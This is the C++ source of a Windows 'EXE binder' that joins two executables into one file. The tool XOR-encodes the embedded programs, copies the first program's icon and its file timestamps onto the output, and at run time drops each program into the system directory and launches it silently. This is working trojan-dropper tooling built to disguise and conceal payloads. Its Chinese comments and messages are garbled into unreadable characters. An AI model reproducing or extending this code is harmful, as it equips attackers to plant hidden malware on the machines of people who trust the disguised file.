// nteXeBinder.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include "stdio.h"
#include "resource.h"
#include "sys/stat.h"  //����״̬��ʾͷ�ļ�
#include "SYS/TYPES.H" //�������Ͷ���ͷ�ļ�
#include <windows.h>

#pragma pack(1)

#ifdef NDEBUG

#endif // NDEBUG

//��������ʱ��dos����
//#pragma comment( linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"" )
#pragma comment(lib,"msvcrt.lib")
#if (_MSC_VER < 1300)  
#pragma comment(linker,"/IGNORE:4078")  
#pragma comment(linker,"/OPT:NOWIN98")
#endif 
#define WIN32_LEAN_AND_MEAN

typedef struct ICONRESDIR { 
	BYTE Width; 
	BYTE Height; 
	BYTE ColorCount; 
	BYTE reserved; 
} ICONRESDIR;  //ͼ��ṹ

typedef struct tagRESDIR { 
	ICONRESDIR   Icon; 
	WORD    Planes; 
	WORD    BitCount; 
	DWORD   BytesInRes; 
	WORD  IconCursorId; 
} RESDIR; 

typedef struct SIMHEADER { 
	WORD Reserved; 
	WORD ResType; 
	WORD ResCount; 
} SIMHEADER, *PSIMHEADER; 

typedef struct {
	const RESDIR* pcResDir;
	BYTE* pMatchIcon;
} MyEnumResNameProcData;

struct MODIFY_DATA {
	unsigned int finder; // ����(��λ����)
	_off_t my_length;      //�ļ�����(����)
} modify_data = {0x12345678, 0};


void Create_Process(const char* temp_exe, BOOL async);//�����ֽ��ļ�ʱ�Ľ���
void UnbindRun(); //�ֽ���������ļ���ͬʱ��������
BOOL BindFiles(); //��������ִ���ļ�����һ��
BYTE* FindMatchIcon(const RESDIR* pcResDir); //��ѯƥ��ͼ��
void IconsProcess(); //�г�����ͼ��

_off_t prog1_length ;
TCHAR my_name[MAX_PATH];
BYTE *buf ;
//his_nameͼ���ļ���
char his_name[MAX_PATH];
char szDestPathName[MAX_PATH];
char chFirstPathName[MAX_PATH];
char chSecondPathName[MAX_PATH];

UINT key=8;

  
void Encrypt(unsigned char * szBuffer, int len)
{
	  
		for(int i=0;i<len;i++)
		szBuffer[i]=szBuffer[i]^key;
}



void Usage(char *progname)
{
/* Modify here to add your Usage message when the program is
	* called without arguments */
	printf("Usage: %s \n[-f ��һ���ļ�] \n[-s �ڶ����ļ�] \n\[-t ���ɵ�Ŀ���ļ�] \n[-i ʹ�ø��ļ���ͼ�꣬����Ϊ��ѡ��]\n",progname);
    ExitProcess(-1);
}


void HandleOptions(int argc, char **argv)
{
    //���������Ϣ
	int  i=0;	
    for(i=1; i <argc ;i++)
    {
        if (((argv[i][0] != '/') && (argv[i][0] != '-')) || (strlen(argv[i]) < 2)||argc<7)
            Usage(argv[0]);
        else
        {
            switch (tolower(argv[i][1]))
            {
			case 'f':
				if (i+1 >= argc)
					Usage(argv[0]);
				strcpy(chFirstPathName,argv[++i]);
				break;
			case 's':               
				if (i+1 >= argc)
					Usage(argv[0]);
				strcpy(chSecondPathName,argv[++i]);
				break;
			case 't':              
				if (i+1 >= argc)
					Usage(argv[0]);
				strcpy(szDestPathName,argv[++i]);
				break;
			case 'i':
				if (i+1 >= argc)
					Usage(argv[0]);
				strcpy(his_name,argv[++i]);
				break;
			default:
				Usage(argv[0]);
				break;
            }
        }
    }
}

int main(int argc, char* argv[])
{

	//����ָ��ͼ���ļ���ʹ�õ�һ���ļ���ͼ��
	if(strlen(his_name)==0)
		strcpy(his_name,chFirstPathName);
	//��ȡ�����ļ���
	::GetModuleFileName(0, my_name, sizeof(my_name));
	struct _stat ST; 
	_stat(my_name, &ST);
	//���������������������մ�С�����ж��ǰ��ļ����Ƿֽ�ִ���ļ�
	//��ֵ��Ӳ���뵽�����У�������������ļ���ʵ�ʴ�С������
	if(ST.st_size >32768) 
	{		
		//�������ļ�������
		UnbindRun(); 
		//ֱ���˳�����,����ʾ���������
		exit(0);    
	}
	//��Ҫ�����ļ��Ļ�������봦�������Ϣ
	HandleOptions(argc, argv);
	BindFiles();
	return 0;
}


//ö������ͼ����Դ
BOOL CALLBACK MyEnumResNameProc(
 HMODULE hExe,   // ��Դ���
 LPCTSTR lpszType,  // ��Դ����
 LPTSTR lpszName,   // ��Դ����
 LPARAM lParam    // �Զ�����Ϣ����
)
{
     HRSRC hRsrc = 0;
     HGLOBAL hMem;
     DWORD nDataLen;
     SIMHEADER* pDirHeader;
     RESDIR* pResDir;
     BYTE* pData;
     unsigned int k;

     MyEnumResNameProcData* pMyDataStruct = (MyEnumResNameProcData*)lParam;

     hRsrc = FindResource(hExe, lpszName, RT_GROUP_ICON);
     hMem = LoadResource(hExe, hRsrc);
     pDirHeader = (SIMHEADER*)LockResource(hMem);
     pResDir = (RESDIR*)(pDirHeader+1);

	 //ö��
     for (k = 0; k < pDirHeader->ResCount; k++)
     {
          if (pResDir[k].BytesInRes == pMyDataStruct->pcResDir->BytesInRes &&
               pResDir[k].BitCount == pMyDataStruct->pcResDir->BitCount &&
               pResDir[k].Planes == pMyDataStruct->pcResDir->Planes &&
               memcmp(&pResDir[k].Icon, &pMyDataStruct->pcResDir->Icon, sizeof(pResDir->Icon)) == 0)
          {
			  //if��������Ҳ����GRPICONDIRENTRY�ṹ��ȫƥ��
               hRsrc = FindResource(hExe, MAKEINTRESOURCE(pResDir[k].IconCursorId), RT_ICON); 
               hMem = LoadResource(hExe, hRsrc );

               nDataLen = SizeofResource( hExe, hRsrc );
               pData =(BYTE*)LockResource(hMem);

			   //���÷���ͼ������
               pMyDataStruct->pMatchIcon = pData;
			   //��ֹö��
               return FALSE; 
          }
     }
     return TRUE;
}

 //��ѯƥ��ͼ��
BYTE* FindMatchIcon(const RESDIR* pcResDir)
{
     HMODULE hExe;
     MyEnumResNameProcData myDataStruct;
     
     myDataStruct.pMatchIcon = NULL;
     myDataStruct.pcResDir = pcResDir;

     hExe = LoadLibraryEx(his_name, NULL, LOAD_LIBRARY_AS_DATAFILE);
	 
	 if (hExe ==NULL)
     {
		 GetLastError();
		 return NULL;
     }

     if (EnumResourceNames(hExe, RT_GROUP_ICON, MyEnumResNameProc, (LPARAM)&myDataStruct) == 0 && 
          myDataStruct.pMatchIcon == 0)
     {
          printf("�ļ���û���ҵ�ͼ��,��Ĭ��ͼ��");

		  return NULL;
     }

     return myDataStruct.pMatchIcon;
}

//�г�����ͼ��
void IconsProcess()
{
     HRSRC hRsrc;
	 // Ϊ0ʱ����ʾΪ����ģ��
     const HMODULE hExe = 0; 
     HGLOBAL hMem;
     DWORD nDataLen = 0;
     SIMHEADER* pDirHeader;
     RESDIR* pResDir;
     unsigned int ii, kk, n;
     
	 //��������ģ�飬�ҳ����е�������ͼ��ΪĬ�Ϻϳ��ļ�ͼ��(�����һ��Ҫ���ļ���ͼ��Ļ�)
     hRsrc = FindResource(hExe, MAKEINTRESOURCE(IDI_ICON1), RT_GROUP_ICON); 
     hMem = LoadResource(hExe, hRsrc );

     nDataLen = SizeofResource( hExe, hRsrc );
     pDirHeader = (SIMHEADER*)LockResource(hMem);
	 //GRPICONDIRENTRY �ṹ
     pResDir = (RESDIR*)(pDirHeader+1);
     //���ڴ���������ͼ����Դͷ��
     for (ii = 0; ii < modify_data.my_length - nDataLen; ii++)
     {
          for (kk = 0; kk < nDataLen; kk++)
          {
               if (buf[ii+kk] != ((BYTE*)pDirHeader)[kk])
                    break;
          }

		  //��ȫƥ��ʱ��if���Ϊ�棬�˳�ѭ��
          if (kk == nDataLen)
               break;
     }

	 //pDirHeader->ResCountΪͼ����Դ��ͼ��ĸ�����ö�ٸ���������ͼ��
     for (n = 0; n < pDirHeader->ResCount; n++)
     {
          DWORD nDataLen1 = 0;
          //ָ��ͼ��ͼ������
		  BYTE* pData;
          unsigned int i, k;

		  //����ͼ��
          hRsrc = FindResource(hExe, MAKEINTRESOURCE(pResDir[n].IconCursorId), RT_ICON); 
          hMem = LoadResource(hExe, hRsrc );

          nDataLen1 = SizeofResource( hExe, hRsrc );

		  //���������÷���ͼ������ָ��
          pData= (BYTE*)LockResource(hMem);
		  //��buf��Ҳ�����ڴ��е������ļ��в��ұ�ͼ���Ա��滻
          for (i = 0; i < modify_data.my_length - nDataLen1; i++)
          {
               for (k = 0; k < nDataLen1; k++)
               {
                    if (buf[i+k] != pData[k])
                         break;
               }
			   //��if���Ϊ�棬�����ļ��ж�λͼ��ɹ����������ֶ�����д�����
               if (k == nDataLen1)
               {
                    BYTE* pMatchIcon = NULL;
                    if (pMatchIcon = FindMatchIcon(pResDir+n))
						//���ҵ�ƥ��ͼ�꣬��ֱ��ʹ���ҵ���ͼ���bufҲ���������ļ���
						//��Ӧͼ����и���
                         memcpy(buf+i, pMatchIcon, nDataLen1);
                    else//
                    {
						//δ����ƥ��ͼ��
                       pResDir[n].BytesInRes = 0; 
                    }

                    break;
               }
          }
     }
	 //�����ͼ����Դ��δ���ֵ�ͼ�꣬��ͼ����Դ���ļ�����ʼ��ַbuf+ii
	 //ʵ���ϣ�û�з��ֵ�ͼ��Ĵ�С�ѱ���Ϊ0:pResDir[n].BytesInRes = 0; 
	 //����ʹ�õ���ͼ��ʱ��Windows������ͼ���ѡȡ����ѡȡ���������ͼ��
	 memcpy(buf+ii, pDirHeader, nDataLen);
}

void Create_Process(const char* temp_exe, BOOL async)
{
     HANDLE hProcess;
     HANDLE hThread;
     PROCESS_INFORMATION PI;
     STARTUPINFO SI;

     memset(&SI, 0, sizeof(SI));
     SI.cb = sizeof(SI);
	 CreateProcess(temp_exe, NULL, NULL, NULL, FALSE,NORMAL_PRIORITY_CLASS, NULL, NULL, &SI, &PI);	      

	 hProcess = PI.hProcess;       
     hThread = PI.hThread;
	 //�첽ִ��ʱ��ִ�к�ɾ���ֽ����ļ�;ͬ��ִ��ʱ��ִ�к�ɾ���ֽ����ļ�
     if (!async)  //ͬ��ִ��
     {
          WaitForSingleObject(hProcess, INFINITE);
          unlink(temp_exe);
     }
}

//�ֽ���������ļ���ͬʱ��������
void UnbindRun()
{
	//�����ļ�
	FILE* myself;         
	//�ֽ���ļ�
	FILE* out;            
	int bytesin;
	int totalbytes = 0;
	long nFileStepbytes = 0;
	//�ļ������������ж���ļ���Ҫ���
	int nIndex = 1;
	
	TCHAR chSystemDir[MAX_PATH],strSystemDir[MAX_PATH];
	GetSystemDirectory(chSystemDir,MAX_PATH);
	strcpy(strSystemDir,chSystemDir);
	
	//����������ԭʼ�ļ���С��ȵĻ�������
	buf = (BYTE*)malloc(modify_data.my_length);
	//�����յĺϳ��ļ�
	myself = fopen(my_name, "rb");  
	if (myself == NULL)
	{
		free(buf);
		printf("�������ļ��У��������ļ�ʱ����!");
		return;
	}
	
	//��������:ԭʼ�ļ���С
	nFileStepbytes = nFileStepbytes + modify_data.my_length;
	
	struct _stat ST;
	_stat(my_name, &ST);
	//�������������ļ���С����ʱѭ����
	//ֱ�������ļ�����������ϣ����߲����
	while(nFileStepbytes != ST.st_size)
	{
		totalbytes = 0;     
		char temfile[MAX_PATH];
		//..sys\tem1.exe
		sprintf(temfile,"%s%s%d%s",strSystemDir,"\\temp",nIndex,".exe");
		//������һ���󶨵��ļ�
		out = fopen(temfile, "wb");   
		if (out == NULL)
		{
			free(buf);
			printf("�������ļ��У�������һ�������ļ�ʱ����!");
			return;
		}
		
		//���ļ�ָ�붨λ�����������򳤶�β������Ϊ�����ž��ǰ��ļ��ĳ���
		fseek(myself, nFileStepbytes, SEEK_SET);
		//��ȡ��һ�����ļ��ĳ��ȡ�
		if (fread(&prog1_length, sizeof(prog1_length), 1, myself) == 0)
		{
			free(buf);
			printf("�������ļ��У���ȡ��һ�������ļ�����ʱ����!");
			return;
		}
		
		//��ȡ��һ���ļ����ݽ�����buf����д������
		while (bytesin = fread(buf, 1, sizeof(buf), myself))
		{
			//����ʱ��һ���ļ��Ѷ������Ѷ����ڶ����ļ�
			if (totalbytes + bytesin > prog1_length)
				//ʵ���ϣ��ϴ�fread������
				//ֻ��(prog1_length - totalbytes)�ֽ��������ڵ�һ���ļ�
				bytesin = prog1_length - totalbytes;
			//���������ļ�����
			Encrypt(buf,bytesin);
			//�����ܺ������д������
			totalbytes += fwrite(buf, 1, bytesin, out);
		}
		//�رյ�һ�����ļ����
		fclose(out);  
		
		if (totalbytes == 0)
		{
			free(buf);
			printf("�������ļ��У��������ļ���û�б�������Ķ���!");
			return;
		}
		//���������������������������ļ�һ�ĳ��Ⱥ�sizeof(prog1_length)
		nFileStepbytes = nFileStepbytes + sizeof(prog1_length) + prog1_length;
		//��ȡ��һ���ļ�
		nIndex++;
	}
	//�ر����պϳ��ļ����
	fclose(myself); 
	//�ͷŻ�����
	free(buf);   
		
	//��Ϊ�ֽ��Ϊ�첽ִ�з�ʽ����ʱnIndex��ֵΪ���������õ��ļ��ĸ���
	for(int i = 1; i < nIndex; i++)
	{
		char temfile[MAX_PATH];
		sprintf(temfile,"%s%s%d%s",strSystemDir,"\\temp",i,".exe");
		//���г���
		Create_Process(temfile, TRUE); 
	}
	
}

//�󶨶���ļ�Ϊһ���ϳ��ļ�
BOOL BindFiles()
{
    //�����ļ�
	FILE* myself; 
	//���պϳ��ļ�
	FILE* out;
	//�����ļ�
	FILE* in;
	int bytesin;
	int totalbytes = 0;
	struct _stat ST;
	unsigned int finder = 0x12345678;
	unsigned int i, k;

     _stat(my_name, &ST);
	 //�洢�����ļ�ԭʼ��С
     modify_data.my_length = ST.st_size;
     if (modify_data.my_length == 0)
     {
          printf("���ļ��У������ļ�����Ϊ��ʱ����!");
		  return FALSE;
     }

	 //��������ԭʼ��С�Ļ���������ȫ�ֱ���bufָ��
     buf = (BYTE *)malloc(modify_data.my_length);
     if (buf == NULL)
     {
          printf("���ļ��У����������ļ�����ʱ����!");
		  return FALSE;
     }

	 //�������ļ�
     myself = fopen(my_name, "rb");
     if (myself == NULL)
     {
          free(buf);
          printf("���ļ��У��������ļ�ʱ����!");
		  return FALSE;
     }

	 //�������ļ������ڴ��У���bufָ��
     bytesin = fread(buf, 1, modify_data.my_length, myself);
     fclose(myself);

	 //��ȡ�ļ���С��ʵ���ļ���С����ʱ
     if (bytesin != modify_data.my_length)
     {
          free(buf);
          printf("���ļ��У�������ȫ��ȡ�����ļ�����ʱ����!");
		  return FALSE;
     }
	 //����Ϊsizeof(finder)��ѭ�������ڴ��е�0x12345678��־
     for (i = 0; i < modify_data.my_length - sizeof(finder); i += sizeof(finder))
     {
          //Сѭ��:���ֽڱȽϣ��Բ���0x12345678��־
		 for (k = 0; k < sizeof(finder); k++)
          {
               if (buf[i+k] != ((BYTE*)&finder)[k])
                    break;
          }
		  //����finder��ȫ�ֱ���modify_data��ռλ����Ӧ�ã�
		  //��һ���ֶΣ������洢��exe�ļ���ĳ���������ڶ�λ�ļ�����
		  if (k == sizeof(finder))
          {			  
              //��ʱ��˵��0x12345678��־����ȫƥ�䣬��modify_data�����ڴ�λ��
			  //��Ϊ�ڴ�֮ǰ��modify_data.my_length�ѱ���ʼ��Ϊ�ļ������С
			  memcpy(buf+ i, &modify_data, sizeof(modify_data));
              break;
          }
     }
	 
     if (i >= modify_data.my_length - sizeof(finder))
     {
          free(buf);
          printf("���ļ��У����ܶ�λ�����ļ�ʱ����!");
		  return FALSE;
     }	 
	 //ͼ��Ĵ���
	 IconsProcess();
	 //�������պϳ��ļ�
	 out = fopen(szDestPathName, "wb"); 
     if (out == NULL)
     {
          free(buf);
          printf("���ļ��У������󶨺����ɵĺϳ��ļ�ʱ����!");
		  return FALSE;
     }

	 char listfile[2][MAX_PATH];
	 strcpy(listfile[0],chFirstPathName);
	 strcpy(listfile[1],chSecondPathName);
	 //���������ļ�
	 int n=2;
	 for(int j = 0; j < n; j++)
	 {		
		 char strFilePath[MAX_PATH];
		 strcpy(strFilePath,listfile[j]);
		 
		 if (_stat(strFilePath, &ST) != 0 || ST.st_size == 0)
		 {
			 free(buf);
			 printf("���ļ��У���ȡҪ�󶨵��ļ�ʱ����!");
			 return FALSE;
		 }
		 
		 totalbytes += fwrite(buf, 1, bytesin, out);
		 
		 //��Ҫ�󶨵��ļ�
		 in = fopen(strFilePath, "rb");  
		 if (in == NULL)
		 {
			 free(buf);
			 printf("���ļ��У���Ҫ�󶨵��ļ�ʱ����!");
			 return FALSE;
		 }
		 
		 
		 //д��Ҫ���ļ��ĳ��ȵ��ϳ��ļ���
		 totalbytes += fwrite(&ST.st_size, 1, sizeof(ST.st_size), out);
		 
		 //д�ļ����ݣ����Ƚ����ݶ���������buf��ÿ�ζ��Ĵ�СΪnteXeBinder�Ĵ�С
		 while (bytesin = fread(buf, 1, modify_data.my_length, in))
		 {
			 //�������ݣ��Ա��ӱ�ɱ������ı���
			 Encrypt(buf,bytesin);
			 totalbytes += fwrite(buf, 1, bytesin, out);
		 }
		 //�رհ��ļ����
		 fclose(in); 		 
	 }     

	 //�ر����պϳ��ļ����
	 fclose(out); 
	 //�ͷŻ�����
     free(buf);   

	 printf("\n����ɹ�!\n");
	 //////////////////////////////
	 //�����ļ���ʱ������
	 //////////////////////////////
	 FILETIME		lpCreationTime;
	 FILETIME		lpLastAccessTime;
	 FILETIME		lpLastWriteTime;
	 
	 HANDLE hTimeFile = CreateFile(chFirstPathName, GENERIC_READ,
		 FILE_SHARE_READ|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 
		 FILE_ATTRIBUTE_NORMAL, NULL); 	
	 GetFileTime(hTimeFile, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);
	  

	 HANDLE hDestFile = CreateFile(szDestPathName, 
		 GENERIC_WRITE|GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL); 	
	 SetFileTime(hDestFile, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);
	 
	 CloseHandle(hTimeFile);
	 CloseHandle(hDestFile); 
	 return TRUE;
}



